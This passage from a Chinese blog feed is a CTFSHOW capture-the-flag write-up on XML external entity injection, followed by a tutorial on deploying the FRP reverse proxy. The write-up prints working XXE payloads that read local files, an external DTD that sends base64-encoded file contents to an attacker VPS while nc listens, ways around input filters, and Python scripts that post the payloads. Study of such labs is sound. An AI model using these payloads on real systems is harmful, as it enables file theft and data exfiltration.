title="什么是XXE"></a>什么是XXE</h2><p>XXE全称是“XML外部实体注入”（XML External Entity Injection），当一个应用程序接收并解析了用户提交的XML数据，但其XML解析器配置不当时，就容易产生XXE漏洞</p><p>流程大概如下</p><ol><li>构造一个恶意的XML文档</li><li>在文档中定义一个指向服务器本地敏感文件的外部实体，例如： <code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></li><li>在XML数据中引用这个实体 <code>&amp;xxe;</code></li><li>服务器在解析这段XML时，会查找并读取 <code>/etc/passwd</code> 文件的内容，并用它替换掉 <code>&amp;xxe;</code></li><li>最后，攻击者通过页面的回显（有回显XXE）或将数据发送到自己的服务器（无回显XXE）来窃取信息</li></ol><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><p>题目给了源码，我们可以分析一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724134347443.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//允许加载外部实体，在PHP 8.0及以上版本，此项默认为true。</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//从HTTP请求的body中读取原始数据，一般是POST请求的内容。</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line"><span class="comment">//新建一个DOMDocument对象，用于处理XML。</span></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="comment">//LIBXML_NOENT: 替换XML文档中的实体；LIBXML_DTDLOAD: 允许加载外部DTD。</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment">//把DOM对象转换为PHP对象。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br></pre></td></tr></table></figure><p>由源码可知，这是个<strong>有回显</strong>的XXE，因此直接POST注入即可</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对应源码的$ctfshow = $creds-&gt;ctfshow; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724140022120.png"></p><h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>分析源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724141018573.png"></p><p>相比上一题，这一题少了回显代码，也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure><p>因此这是个<strong>无回显</strong>的XXE，需要用到vps进行数据外带显示</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p>然后在vps的<strong>网站根目录</strong>创建test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM &#x27;http://vps地址:1234/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%out;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724142912722.png"></p><p>保存文件并退出Vim：按下ESC进入命令模式，然后输入<code>:wq</code>并按回车键</p><p>最后在服务器用nc监听1234端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>接着发送POST请求</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724143630436.png"></p><p>重新回到vps查看加密内容，然后base64解码即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724143750217.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250724143825410.png"></p><p>我们来分析一下思路，简单来说就是初始Payload调用了外部DTD，外部DTD中先用一个实体<code>%eval;</code>去<strong>定义</strong>另一个能发送数据的实体<code>%out;</code>，然后再<strong>调用</strong>这个新实体将文件内容外带出来</p><p>那为什么要这样子套娃，直接调用不可以吗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;http://vps地址:1234/?x=%file;&quot;&gt;  %out;</span><br></pre></td></tr></table></figure><p>如果直接调用，上面第二步中的 <code>&lt;!ENTITY % out ...&gt;</code> 会直接导致XML解析器报错。因为在解析器看来，<code>%file;</code> 这个<strong>引用</strong>被用在了另一个实体 <code>out</code> 的<strong>定义字符串</strong>里，这是不被允许的</p><p>因此我们需要嵌套使用，用外部实体<code>%eval;</code>把内层命令伪装成一个字符串，当外部实体被调用后，此时<code>%file;</code> 实体已经被定义过了，最后再调用<code>%out;</code>，就可以成功执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM &#x27;http://vps地址:1234/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%out;</span><br></pre></td></tr></table></figure><h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><p>先看看源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724154423355.png"></p><p>跟上一题差不多，不过这次多了一个过滤条件，由于它是匹配整一个语句<code>&lt;?xml version=&quot;1.0&quot;</code>，因此有很多方法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法一：</p><p>在xml和version中加一个空格</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724160447113.png"></p><p>方法二：</p><p>直接把<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>去掉</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724160517559.png"></p><p>方法三：</p><p>把双引号改成单引号，即<code>&lt;?xml version=&#39;1.0&#39; encoding=&quot;UTF-8&quot;?&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724160340485.png"></p><p>随便选一种方法做即可，其他步骤跟上一题一样，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724160023562.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250724160050518.png"></p><h3 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h3><p>先看源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724161558421.png"></p><p>相比上一题，这题的过滤条件多了一个检测大小写功能，但是不影响做题，可以用上一题的方法</p><h3 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h3><p>分析源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724164321245.png"></p><p>这次多了一个http的过滤，可以用编码绕过，xml不仅支持UTF-8编码，也支持UTF-16、UTF-32和EBCDIC编码</p><p>因此我们在web375绕过<code>&lt;?xml version=&quot;1.0&quot;</code>的基础上，加一个编码转换即可，用python脚本完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://48e31982-9b66-42aa-b386-f34f7b7f8d36.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>先在vps监听端口，然后运行脚本</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724165226913.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250724165303767.png"></p><h3 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h3><p>打开题目看到一个登录框</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724165542892.png"></p><p><code>ctrl+u</code>查看网页源码，可以判断存在XXE漏洞</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724171149199.png"></p><p>在登录框页面随便输入个账号密码，可以看到有回显，因此是属于<strong>有回显</strong>的XXE</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724171446705.png"></p><p>因此我们可以构造XML payload，然后POST发送到&#x2F;doLogin即可，这里用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39e1f8ce-fd5e-483d-a620-38d00350bff3.challenge.ctf.show/doLogin&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724180656298.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW XXE专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>工具推荐 | 内网穿透神器FRP部署教程</title>
    <link href="https://waynejoon.github.io/posts/frp-deployment-tutorial/"/>
    <id>https://waynejoon.github.io/posts/frp-deployment-tutorial/</id>
    <published>2025-07-22T06:48:46.000Z</published>
    <updated>2025-07-22T06:58:06.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>FRP是一款高性能的反向代理工具，可以将位于NAT或防火墙后的本地服务器暴露到互联网上。目前支持TCP、UDP、HTTP和HTTPS协议，可通过域名将请求转发至内部服务，此外还提供P2P直连模式</p><p>Github地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>本文尽可能简单叙述，方便大家快速部署，因当前最新版是0.63.0，因此本文在0.63.0的基础上书写</p><h2 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h2><ol><li>一台拥有<strong>公网IP</strong>的服务器（推荐阿里云、腾讯云等）</li><li>一个域名（非必需）</li></ol><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>打开<a href="https://github.com/fatedier/frp/tree/v0.63.0">https://github.com/fatedier/frp/tree/v0.63.0</a>, 下载frp_0.63.0_linux_amd64.tar.gz</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722105650691.png"></p><p>上传到服务器然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf frp_0.63.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>cd进入<code>frp_0.63.0_linux_amd64</code>文件夹，输入<code>vim frps.toml</code>编辑frps.toml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># frp客户端与服务端连接的端口</span><br><span class="line">bindPort = 7000</span><br><span class="line"></span><br><span class="line"># 用来接收HTTP请求的端口</span><br><span class="line">vhostHTTPPort = 8088#如端口冲突可自行切换</span><br><span class="line"></span><br><span class="line"># 认证配置</span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;  #用于连接验证，请自行设置</span><br><span class="line"></span><br><span class="line"># Web仪表盘配置</span><br><span class="line">[webServer]</span><br><span class="line">addr = &quot;0.0.0.0&quot;</span><br><span class="line">port = 7500</span><br><span class="line">user = &quot;admin&quot;#请自行设置</span><br><span class="line">password = &quot;admin&quot;#请自行设置</span><br></pre></td></tr></table></figure><p>按下ESC进入命令模式，然后输入<code>:wq</code>并按回车键，保存文件并退出Vim</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>为了能在后台持续运行，这里用screen启动一个新窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S frp#名字可以自定义</span><br></pre></td></tr></table></figure><p>赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frps</span><br></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.toml</span><br></pre></td></tr></table></figure><p>按下组合键 <code>ctrl+a+d</code> 关闭当前screen窗口，运行下面的命令可以再次进入窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen -ls#查看当前screen状态</span><br><span class="line">screen -r frp</span><br></pre></td></tr></table></figure><h3 id="网页仪表盘"><a href="#网页仪表盘" class="headerlink" title="网页仪表盘"></a>网页仪表盘</h3><p>成功运行之后，打开<code>http://你的服务器IP:7500</code>，即可进入仪表盘页面，可以查看当前的配置、连接等状态</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722110625687.png"></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>打开<a href="https://github.com/fatedier/frp/tree/v0.63.0">https://github.com/fatedier/frp/tree/v0.63.0</a>, 下载frp_0.63.0_windows_amd64.zip</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722105755964.png"></p><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>解压并打开文件夹，编辑<code>frpc.toml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;#需要跟服务端的token保持一致，用于验证</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;#可自行设置</span><br><span class="line">type = &quot;tcp&quot;#穿透的协议类型，ip+端口的话用tcp</span><br><span class="line">localPort = 80#需要穿透的本机端口</span><br><span class="line">remotePort = 8085#指定服务端访问的端口，也就是可以通过&quot;你的服务器IP:8085&quot;访问到本机的&quot;127.0.0.1:80&quot;</span><br></pre></td></tr></table></figure><h3 id="可选-域名配置"><a href="#可选-域名配置" class="headerlink" title="(可选)域名配置"></a>(可选)域名配置</h3><p>如果你有自己的域名，则可以进行域名配置，以获得更佳的体验</p><p>我这里用的是namesilo，其他的域名提供商也一样操作</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722112515304.png"></p><p>具体操作就是在DNS Record添加一条A记录，地址填你的服务器IP，名字可以自定义，后面就通过这个子域名访问你的服务</p><p>然后打开<code>frpc.toml</code>重新编辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;#需要跟服务端的token保持一致，用于验证</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;</span><br><span class="line">type = &quot;http&quot;#域名+端口的话需要用http</span><br><span class="line">localPort = 80#需要穿透的本机端口，也就是可以通过&quot;你的域名:8088&quot;访问到本机的&quot;127.0.0.1:80&quot;</span><br><span class="line">customDomains = [&quot;win.xxxxxx.com&quot;]#这里用你自己的域名</span><br></pre></td></tr></table></figure><p>需要注意的是，当代理类型为 <code>http</code> 或 <code>https</code>时，访问端口由<strong>服务端</strong>的 <code>vhostHTTPPort</code>决定，而不是客户端的 <code>remotePort</code></p><h3 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h3><p>在<code>frp_0.63.0_windows_amd64</code>文件夹打开cmd，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure><p>然后公网访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的服务器IP:8085</span><br></pre></td></tr></table></figure><p>如果你配置了域名，就可以公网访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.xxxxxx.com:8088</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>这里我举个简单的例子，方便大家理解</p><h3 id="无域名"><a href="#无域名" class="headerlink" title="无域名"></a>无域名</h3><p>我在本地部署了一个DVWA漏洞靶场，假如我想把它分享给其他人，应该怎么做</p><p>在服务端部署完毕后，回到本地电脑，phpstudy打开服务</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722124025986.png"></p><p>由于我的DVWA部署在本地8084端口，因此先修改<code>frpc.toml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">localPort = 8084#需要穿透的本机端口</span><br><span class="line">remotePort = 8085#指定服务端的端口</span><br></pre></td></tr></table></figure><p>然后保存退出，在当前文件夹cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure><p>接着访问<code>你的服务器IP地址:8085</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722124430952.png"></p><h3 id="有域名"><a href="#有域名" class="headerlink" title="有域名"></a>有域名</h3><p>同样是以DVWA漏洞靶场为例，先用phpstudy打开服务，然后修改<code>frpc.toml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;</span><br><span class="line">type = &quot;http&quot;</span><br><span class="line">localPort = 8084#需要穿透的本机端口</span><br><span class="line">customDomains = [&quot;win.xxxxxx.com&quot;]#这里用你自己的域名</span><br></pre></td></tr></table></figure><p>然后保存退出，在当前文件夹cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure><p>接着访问<code>你的域名:8088</code>即可</p><h2 id="常见问题与排错-FAQ"><a href="#常见问题与排错-FAQ" class="headerlink" title="常见问题与排错 (FAQ)"></a>常见问题与排错 (FAQ)</h2><p>如果你发现连接不到服务端的端口，请检查防火墙是否放行相关端口，如果系统本身已放行端口但仍无法访问，可能是服务器提供商那边的防火墙未放行，这时需要到提供商那边（假如是阿里云）放行相关端口</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722133856406.png"></p>]]></content>
    
    
    <summary type="html">教你如何快速简单部署FRP</summary>
    
    
    
    <category term="工具推荐" scheme="https://waynejoon.github.io/categories/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"/>
    
    
    <category term="工具推荐" scheme="https://waynejoon.github.io/tags/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | Where-1S-tHe-Hacker-P2</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/</id>
    <published>2025-07-20T04:23:32.000Z</published>
    <updated>2025-07-20T04:25:40.881Z</updated>
    
